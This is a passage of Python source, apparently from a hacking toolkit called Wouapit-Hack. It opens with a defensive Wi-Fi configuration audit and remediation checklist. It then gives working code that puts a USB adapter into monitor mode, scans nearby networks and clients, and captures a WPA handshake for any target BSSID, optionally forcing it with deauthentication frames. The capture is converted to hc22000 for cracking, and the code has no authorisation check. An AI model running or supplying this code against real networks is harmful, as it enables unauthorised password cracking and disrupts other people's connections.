            "impact": "Every packet (URLs, cookies for non-HTTPS sites, DNS queries) is readable by anyone in range.",
            "remediation": "Enable WPA2-Personal minimum. Prefer WPA3-Personal on modern hardware.",
        })
        audit["risk_score"] += 90
    elif "WEP" in enc:
        audit["findings"].append({
            "type": "WEP Encryption",
            "severity": "CRITICAL",
            "description": "WEP is fundamentally broken — crackable in under 5 minutes with aircrack-ng.",
            "cvss": 9.8,
            "remediation": "Replace router if it doesn't support WPA2. Otherwise switch immediately.",
        })
        audit["risk_score"] += 95
    elif "WPA-TKIP" in enc or "TKIP" in enc:
        audit["findings"].append({
            "type": "WPA/TKIP Encryption",
            "severity": "HIGH",
            "description": "TKIP is deprecated (2012). Vulnerable to key-recovery and packet-injection attacks.",
            "remediation": "Configure router for WPA2-CCMP (AES) only. Disable TKIP fallback.",
        })
        audit["risk_score"] += 60
    elif "WPA2" in enc and "PERSONAL" in enc:
        audit["findings"].append({
            "type": "WPA2-Personal (PSK)",
            "severity": "MEDIUM",
            "description": "Secure IF password is 20+ random chars. Otherwise vulnerable to offline dictionary attack.",
            "remediation": "Use 20+ character random passphrase. Upgrade to WPA3 if router supports it.",
        })
        audit["risk_score"] += 30
    elif "WPA3" in enc:
        audit["findings"].append({
            "type": "WPA3 — Modern Encryption",
            "severity": "LOW",
            "description": "WPA3-SAE resists offline dictionary attacks. Ensure Transition Mode is disabled for full protection.",
        })
        audit["risk_score"] += 10

    # SSID-derived recommendations
    if target_ssid:
        default_ssids = ["netgear", "linksys", "tp-link", "d-link", "asus", "belkin", "cisco",
                          "orange_", "sfr_", "livebox", "bbox", "camtel", "mtn_", "orange_wifi"]
        if any(d in target_ssid.lower() for d in default_ssids):
            audit["findings"].append({
                "type": "Default SSID Detected",
                "severity": "MEDIUM",
                "description": f"SSID '{target_ssid}' matches a default router-vendor pattern.",
                "remediation": "Change SSID. Default names reveal router model and enable targeted attacks.",
            })
            audit["risk_score"] += 15
        if len(target_ssid) < 3:
            audit["findings"].append({
                "type": "Very Short SSID",
                "severity": "LOW",
                "description": "Short SSIDs correlate with older/weaker configurations.",
            })

    # Universal remediation controls
    audit["remediation"] = [
        {"priority": "P1", "action": "Upgrade to WPA3-Personal (SAE) where hardware supports it."},
        {"priority": "P1", "action": "Set passphrase: minimum 20 characters, mix of upper/lower/digits/symbols, generated by a password manager."},
        {"priority": "P2", "action": "Disable WPS (WiFi Protected Setup) — vulnerable to PIN brute force."},
        {"priority": "P2", "action": "Enable 802.11w (Protected Management Frames) to prevent deauth attacks."},
        {"priority": "P2", "action": "Disable UPnP unless a specific service requires it."},
        {"priority": "P2", "action": "Change default router admin credentials (see Router Defaults tab)."},
        {"priority": "P3", "action": "Enable router firmware auto-updates or check monthly."},
        {"priority": "P3", "action": "Segregate guest WiFi onto separate VLAN with no LAN access."},
        {"priority": "P3", "action": "Reduce transmit power to minimum needed for coverage — reduces attack surface."},
        {"priority": "P3", "action": "Log connection events; alert on unknown MAC addresses."},
        {"priority": "P4", "action": "Consider MAC filtering as defence-in-depth (bypassable but adds friction)."},
        {"priority": "P4", "action": "For high-security environments: switch to WPA3-Enterprise with 802.1X + RADIUS + client certificates."},
    ]

    audit["controls_checklist"] = [
        {"control": "WPA3 or WPA2-CCMP only (no TKIP/WEP/Open)",  "critical": True},
        {"control": "Passphrase length ≥ 20 chars, high entropy", "critical": True},
        {"control": "WPS disabled",                                "critical": True},
        {"control": "Default admin credentials changed",           "critical": True},
        {"control": "Router firmware current (< 6 months old)",    "critical": True},
        {"control": "802.11w (PMF) enabled",                       "critical": False},
        {"control": "Guest network isolated (client isolation on)","critical": False},
        {"control": "Remote management disabled",                  "critical": True},
        {"control": "UPnP disabled",                               "critical": False},
        {"control": "SSID not vendor-default",                      "critical": False},
        {"control": "Logging enabled + reviewed",                  "critical": False},
    ]

    audit["risk_score"] = min(100, audit["risk_score"])
    audit["overall_verdict"] = (
        "CRITICAL — Immediate action required" if audit["risk_score"] >= 80 else
        "HIGH RISK — Fix within 72 hours"      if audit["risk_score"] >= 50 else
        "MODERATE — Improvements recommended"  if audit["risk_score"] >= 25 else
        "ACCEPTABLE — Maintain vigilance"
    )
    return audit


# ═══════════════════════════════════════════════════════════════════════════
# LIVE HARDWARE — USB antenna detection + monitor mode + real scanning
# Only works when running locally (Linux + root). Returns clear message on Vercel.
# ═══════════════════════════════════════════════════════════════════════════

import os as _os, subprocess as _sp, platform as _plat, json as _json

def _running_on_vercel() -> bool:
    return bool(_os.environ.get("VERCEL")) or bool(_os.environ.get("AWS_LAMBDA_FUNCTION_NAME"))

def _run(cmd: list, timeout: int = 10) -> dict:
    """Run a subprocess and return stdout/stderr/rc — never raise."""
    try:
        r = _sp.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": r.returncode, "stdout": r.stdout, "stderr": r.stderr}
    except FileNotFoundError:
        return {"rc": -1, "stdout": "", "stderr": f"Command not found: {cmd[0]}"}
    except _sp.TimeoutExpired:
        return {"rc": -2, "stdout": "", "stderr": "Command timeout"}
    except Exception as e:
        return {"rc": -3, "stdout": "", "stderr": str(e)}


# Common USB WiFi chipsets known to support monitor mode + packet injection
WIFI_CHIPSETS = {
    "0bda:8812": ("Realtek RTL8812AU", "AC1200 — supports monitor/injection with aircrack-ng-latest drivers"),
    "0bda:8813": ("Realtek RTL8814AU", "AC1900"),
    "0bda:c811": ("Realtek RTL8811AU", "AC600"),
    "148f:5370": ("Ralink RT5370",     "802.11n — classic pentest chipset, plug and play"),
    "148f:5372": ("Ralink RT5372",     "802.11n dual antenna"),
    "148f:3070": ("Ralink RT3070",     "Legacy 802.11n — works out of the box"),
    "0cf3:9271": ("Atheros AR9271",    "Alfa AWUS036NHA — best-of-class 2.4GHz, native Linux driver"),
    "0cf3:7015": ("Atheros AR9002U",   ""),
    "2357:0120": ("Realtek RTL8188EUS","TP-Link TL-WN722N v2/v3 — needs custom driver"),
    "0bda:8179": ("Realtek RTL8188EUS","TL-WN722N v2/v3"),
    "0bda:2838": ("Realtek RTL2832U",  "RTL-SDR / DVB-T dongle"),
    "0e8d:7612": ("MediaTek MT7612U",  "AC1200 — used by Alfa AWUS036ACS"),
    "0e8d:7961": ("MediaTek MT7921AU", ""),
}


def detect_usb_wifi_adapters() -> dict:
    """List USB devices; flag known WiFi adapters that support monitor mode + injection."""
    result = {
        "timestamp":     datetime.utcnow().isoformat(),
        "platform":      _plat.system(),
        "local_execution": not _running_on_vercel(),
        "wifi_adapters": [],
        "all_usb":       [],
        "notes":         [],
    }
    if _running_on_vercel():
        result["error"] = "Running on Vercel serverless — no USB / hardware access."
        result["how_to_run_locally"] = [
            "git clone https://github.com/wouapit999/Wouapit-Hack",
            "cd Wouapit-Hack && pip install -r requirements.txt",
            "sudo python app.py    # sudo needed for airmon-ng, iw, aireplay-ng",
            "Open http://localhost:5000/wireless",
        ]
        result["required_tools"] = [
            "iw          (apt install iw)",
            "aircrack-ng (apt install aircrack-ng)",
            "hcxdumptool (apt install hcxdumptool)",
            "usbutils    (apt install usbutils   # provides lsusb)",
        ]
        return result

    if _plat.system() == "Linux":
        # lsusb enumerates USB devices with vendor:product IDs
        lsusb = _run(["lsusb"], timeout=5)
        if lsusb["rc"] == 0:
            for line in lsusb["stdout"].splitlines():
                # Format: "Bus 001 Device 004: ID 0cf3:9271 Atheros Communications, Inc. AR9271 802.11n"
                m = re.match(r"Bus\s+(\d+)\s+Device\s+(\d+):\s+ID\s+([0-9a-f]{4}:[0-9a-f]{4})\s+(.*)", line)
                if not m:
                    continue
                bus, dev, vid_pid, desc = m.groups()
                entry = {"bus": bus, "device": dev, "id": vid_pid, "description": desc}
                result["all_usb"].append(entry)
                if vid_pid in WIFI_CHIPSETS:
                    chipset, note = WIFI_CHIPSETS[vid_pid]
                    entry.update({"chipset": chipset, "note": note, "recommended": True})
                    result["wifi_adapters"].append(entry)
                elif any(w in desc.lower() for w in ["wireless","wifi","802.11","wlan"]):
                    entry.update({"note": "Wireless device — check monitor mode support with 'iw list'"})
                    result["wifi_adapters"].append(entry)
        else:
            result["notes"].append(f"lsusb failed: {lsusb['stderr']}")

        # Also enumerate wireless interfaces via 'iw dev'
        iw = _run(["iw", "dev"], timeout=5)
        if iw["rc"] == 0:
            interfaces = []
            for chunk in re.split(r"^phy#", iw["stdout"], flags=re.MULTILINE):
                m_iface = re.search(r"Interface\s+(\S+)", chunk)
                m_type  = re.search(r"type\s+(\S+)", chunk)
                m_mac   = re.search(r"addr\s+([0-9a-f:]{17})", chunk)
                if m_iface:
                    interfaces.append({
                        "name": m_iface.group(1),
                        "mode": m_type.group(1) if m_type else "?",
                        "mac":  m_mac.group(1) if m_mac else "?",
                        "monitor_capable": True,   # further check with 'iw list' below
                    })
            result["interfaces"] = interfaces
        else:
            result["notes"].append(f"iw dev failed: {iw['stderr']}")

    elif _plat.system() == "Darwin":
        # macOS — system_profiler
        sp = _run(["system_profiler", "SPUSBDataType", "-json"], timeout=8)
        if sp["rc"] == 0:
            try:
                _data = _json.loads(sp["stdout"])
                # walk the tree looking for wireless devices
                def _walk(node, out):
                    if isinstance(node, dict):
                        name = str(node.get("_name", ""))
                        if any(w in name.lower() for w in ["wireless","wifi","802.11","wlan"]):
                            out.append({"name": name, "vendor_id": node.get("vendor_id",""),
                                        "product_id": node.get("product_id","")})
                        for v in node.values():
                            _walk(v, out)
                    elif isinstance(node, list):
                        for i in node: _walk(i, out)
                _walk(_data, result["wifi_adapters"])
            except Exception as e:
                result["notes"].append(str(e))
        result["notes"].append("macOS doesn't support monitor mode without kernel extensions. "
                                "Boot into Kali Linux (USB live) for real WiFi pentesting.")

    elif _plat.system() == "Windows":
        # Windows — PowerShell
        ps = _run(["powershell", "-NoProfile", "-Command",
                    "Get-PnpDevice -Class Net,USB | "
                    "Where-Object {$_.FriendlyName -match 'wireless|wifi|802.11|wlan|adapter'} | "
                    "Select-Object FriendlyName, InstanceId, Status | ConvertTo-Json -Depth 3"], timeout=10)
        if ps["rc"] == 0 and ps["stdout"].strip():
            try:
                _data = _json.loads(ps["stdout"])
                items = _data if isinstance(_data, list) else [_data]
                for it in items:
                    result["wifi_adapters"].append({
                        "name":       it.get("FriendlyName","?"),
                        "instance":   it.get("InstanceId",""),
                        "status":     it.get("Status",""),
                    })
            except Exception as e:
                result["notes"].append(str(e))
        result["notes"].append("Windows doesn't support monitor mode on the built-in stack. "
                                "Use Npcap in monitor mode OR boot into Kali Linux for pentesting.")

    if not result["wifi_adapters"]:
        result["message"] = "No wireless adapters detected. Plug in a USB WiFi antenna (Alfa, Panda, or similar)."
    else:
        result["message"] = f"Detected {len(result['wifi_adapters'])} wireless adapter(s)."
    return result


def check_monitor_capability(interface: str = "wlan0") -> dict:
    """Check if an interface / its phy supports monitor mode via iw list."""
    result = {"interface": interface, "timestamp": datetime.utcnow().isoformat()}
    if _running_on_vercel():
        return {"error": "No hardware access on Vercel — run locally as root."}
    if _plat.system() != "Linux":
        return {"error": "Requires Linux + iw + aircrack-ng."}

    # Get the phy for this interface
    iw_dev = _run(["iw", "dev", interface, "info"], timeout=5)
    if iw_dev["rc"] != 0:
        return {"error": f"Interface {interface} not found",
                 "detail": iw_dev["stderr"] or iw_dev["stdout"]}
    m_phy = re.search(r"wiphy\s+(\d+)", iw_dev["stdout"])
    if not m_phy:
        return {"error": "Could not determine phy for interface"}
    phy = f"phy{m_phy.group(1)}"
    result["phy"] = phy

    # iw list to see supported modes for this phy
    iw_list = _run(["iw", "phy", phy, "info"], timeout=5)
    if iw_list["rc"] == 0:
        # look for "* monitor" in supported interface modes
        modes_block = re.search(r"Supported interface modes:(.+?)(?=\n[A-Z]|\Z)",
                                iw_list["stdout"], re.DOTALL)
        modes = []
        if modes_block:
            modes = re.findall(r"\*\s+(\S+)", modes_block.group(1))
        result["supported_modes"] = modes
        result["monitor_supported"] = "monitor" in modes
        # Injection capability via 'aireplay-ng --test' would need monitor first
        result["injection_note"] = ("Test injection with: aireplay-ng --test " + interface + "mon "
                                     "(after enabling monitor)")
    else:
        result["error"] = f"iw list failed: {iw_list['stderr']}"
    return result


def enable_monitor_mode(interface: str = "wlan0") -> dict:
    """Enable monitor mode on an interface. Requires root."""
    result = {"interface": interface, "timestamp": datetime.utcnow().isoformat()}
    if _running_on_vercel():
        return {"error": "No hardware access on Vercel."}
    if _plat.system() != "Linux":
        return {"error": "Only Linux supports monitor mode via airmon-ng."}
    if _os.geteuid() != 0:
        return {"error": "Root required. Run app.py with sudo.",
                 "hint":  "sudo python app.py"}

    # Kill interfering processes
    kill = _run(["airmon-ng", "check", "kill"], timeout=10)
    result["kill_output"] = (kill["stdout"] + kill["stderr"])[:500]

    # Start monitor
    start = _run(["airmon-ng", "start", interface], timeout=10)
    result["start_output"] = (start["stdout"] + start["stderr"])[:1000]

    if start["rc"] != 0:
        result["error"] = "airmon-ng failed to start monitor mode"
        return result

    # Find the new monitor interface name (usually wlan0mon)
    iw_dev = _run(["iw", "dev"], timeout=5)
    mon_ifaces = re.findall(r"Interface\s+(\S+mon)", iw_dev["stdout"])
    if mon_ifaces:
        result["monitor_interface"] = mon_ifaces[0]
        result["success"] = True
        result["message"] = f"Monitor mode enabled on {mon_ifaces[0]}"
    else:
        result["success"] = False
        result["message"] = "airmon-ng ran but no *mon interface appeared. Check output."
    return result


def disable_monitor_mode(interface: str) -> dict:
    """Stop monitor mode and restore NetworkManager."""
    result = {"interface": interface, "timestamp": datetime.utcnow().isoformat()}
    if _running_on_vercel() or _plat.system() != "Linux":
        return {"error": "Only supported on local Linux with root."}
    if _os.geteuid() != 0:
        return {"error": "Root required"}
    stop = _run(["airmon-ng", "stop", interface], timeout=10)
    result["stop_output"] = (stop["stdout"] + stop["stderr"])[:500]
    _run(["systemctl", "start", "NetworkManager"], timeout=5)
    _run(["systemctl", "start", "wpa_supplicant"], timeout=5)
    result["success"] = stop["rc"] == 0
    return result


def airodump_scan_live(monitor_interface: str, duration_sec: int = 15) -> dict:
    """Run airodump-ng for N seconds and parse the CSV output."""
    result = {"interface": monitor_interface, "duration": duration_sec,
              "timestamp": datetime.utcnow().isoformat(),
              "access_points": [], "clients": []}
    if _running_on_vercel() or _plat.system() != "Linux":
        return {"error": "Only supported on local Linux with root + monitor interface."}
    if _os.geteuid() != 0:
        return {"error": "Root required"}

    import tempfile
    tmpdir = tempfile.mkdtemp(prefix="wouapit-scan-")
    prefix = _os.path.join(tmpdir, "scan")

    # airodump-ng with CSV output, timeout via wall clock (airodump has no --duration)
    cmd = ["timeout", str(duration_sec),
           "airodump-ng", "--write", prefix, "--output-format", "csv",
           monitor_interface]
    _run(cmd, timeout=duration_sec + 5)

    # Read the CSV — airodump-ng writes 2 sections separated by blank line
    csv_files = [f for f in _os.listdir(tmpdir) if f.endswith(".csv")]
    if not csv_files:
        result["error"] = "airodump-ng produced no CSV. Check permissions and interface."
        return result
    with open(_os.path.join(tmpdir, csv_files[0]), "r", errors="ignore") as fh:
        content = fh.read()
    sections = content.split("\r\n\r\n")
    # Section 1 = APs
    if len(sections) >= 1:
        for line in sections[0].splitlines()[2:]:  # skip 2 header lines
            fields = [f.strip() for f in line.split(",")]
            if len(fields) < 14 or not fields[0]:
                continue
            result["access_points"].append({
                "bssid":       fields[0],
                "first_seen":  fields[1],
                "last_seen":   fields[2],
                "channel":     fields[3],
                "speed":       fields[4],
                "privacy":     fields[5],
                "cipher":      fields[6],
                "auth":        fields[7],
                "power":       fields[8],
                "beacons":     fields[9],
                "iv":          fields[10],
                "lan_ip":      fields[11],
                "id_length":   fields[12],
                "ssid":        fields[13],
            })
    # Section 2 = Clients
    if len(sections) >= 2:
        for line in sections[1].splitlines()[1:]:
            fields = [f.strip() for f in line.split(",")]
            if len(fields) < 6 or not fields[0]:
                continue
            result["clients"].append({
                "mac":         fields[0],
                "first_seen":  fields[1],
                "last_seen":   fields[2],
                "power":       fields[3],
                "packets":     fields[4],
                "bssid":       fields[5],
                "probed_ssids": fields[6] if len(fields) > 6 else "",
            })
    # Cleanup
    try:
        for f in _os.listdir(tmpdir):
            _os.remove(_os.path.join(tmpdir, f))
        _os.rmdir(tmpdir)
    except Exception:
        pass
    result["ap_count"]     = len(result["access_points"])
    result["client_count"] = len(result["clients"])
    return result


def capture_handshake_live(monitor_interface: str, target_bssid: str,
                            channel: int, duration_sec: int = 60,
                            deauth_client: str = "") -> dict:
    """Passively (or actively with deauth) capture a WPA handshake for target BSSID."""
    result = {"target": target_bssid, "channel": channel, "duration": duration_sec,
              "timestamp": datetime.utcnow().isoformat()}
    if _running_on_vercel() or _plat.system() != "Linux":
        return {"error": "Only supported on local Linux with root + monitor interface."}
    if _os.geteuid() != 0:
        return {"error": "Root required"}

    import tempfile
    tmpdir = tempfile.mkdtemp(prefix="wouapit-hs-")
    prefix = _os.path.join(tmpdir, "hs")

    # Start airodump-ng in background
    ad_proc = _sp.Popen(["timeout", str(duration_sec),
                          "airodump-ng", "--bssid", target_bssid, "-c", str(channel),
                          "--write", prefix, "--output-format", "pcap,csv",
                          monitor_interface],
                         stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)

    # Optional deauth to force handshake
    if deauth_client:
        time.sleep(5)  # let airodump start
        _run(["aireplay-ng", "-0", "5", "-a", target_bssid,
              "-c", deauth_client, monitor_interface], timeout=10)

    ad_proc.wait()

    # Find pcap file
    pcap_files = [f for f in _os.listdir(tmpdir) if f.endswith(".cap")]
    if not pcap_files:
        result["error"] = "No capture file produced"
        return result
    pcap_path = _os.path.join(tmpdir, pcap_files[0])
    result["pcap_size_bytes"] = _os.path.getsize(pcap_path)

    # Convert to hc22000 for cracking
    hc_path = pcap_path.replace(".cap", ".hc22000")
    conv = _run(["hcxpcapngtool", "-o", hc_path, pcap_path], timeout=10)
    if _os.path.exists(hc_path) and _os.path.getsize(hc_path) > 0:
        with open(hc_path, "r") as fh:
            result["hc22000"] = fh.read()
        result["handshake_captured"] = True
        result["message"] = "Handshake captured. Ready to crack in the REAL Cracker tab."
    else:
        result["handshake_captured"] = False
        result["message"] = ("No handshake in capture. Try longer duration, or provide "
                              "deauth_client MAC to force re-authentication.")
        result["conv_stderr"] = conv["stderr"][:300]

    # cleanup pcap (but keep hc22000 embedded in response)
    for f in _os.listdir(tmpdir):
        try: _os.remove(_os.path.join(tmpdir, f))
        except: pass
    try: _os.rmdir(tmpdir)
    except: pass
    return result
